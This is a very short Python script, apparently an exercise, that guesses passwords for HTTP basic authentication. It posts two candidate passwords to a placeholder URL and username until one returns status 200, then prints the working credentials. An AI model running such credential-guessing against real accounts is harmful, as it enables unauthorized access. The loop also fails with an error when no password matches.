import requests
n=0
passwordlist=['tenpura','tempura']
count=0
while n!=200 :
    password=passwordlist[count]
    response = requests.post('<URL>', auth=('<user_name>',password))
    count+=1
    n=response.status_code

    if n!=200 :
        continue

print('ユーザー名:<user_name> パスワード:'+str(password))